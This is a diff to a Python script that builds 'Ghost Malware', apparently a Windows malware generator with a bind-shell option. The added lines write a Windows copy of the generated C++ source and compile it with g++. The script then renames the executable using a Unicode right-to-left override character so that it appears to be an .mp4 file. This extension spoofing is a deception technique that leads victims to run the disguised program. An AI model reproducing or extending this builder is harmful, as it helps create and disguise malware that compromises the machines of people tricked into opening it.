@@ -61,7 +61,13 @@ if(bindshellopt == "Y" or "y"):
 
 generated.writelines(data)
 generated.close()
-if os.system("g++ -x c++ -static-libgcc -static-libstdc++ Generated.cpp -Xlinker settings.o -o " + randomfilename +".exe") == 0:
+#Windows compatibility
+data = data.replace('windows.h','Windows.h')
+generatedwindows = open("Generatedwindows.cpp", "a")
+generatedwindows.truncate(0)
+generatedwindows.writelines(data)
+generatedwindows.close()
+if os.system("g++ -x c++ -static-libgcc -static-libstdc++ Generatedwindows.cpp -Xlinker settings.o -o " + randomfilename +".exe") == 0:
     os.rename(randomfilename + ".exe", randomfilename + "\u202E4pm.exe")
     print("Detected OS: Windows")
     print("\n\nGhost Malware successfully generated! File Name: " + randomfilename)
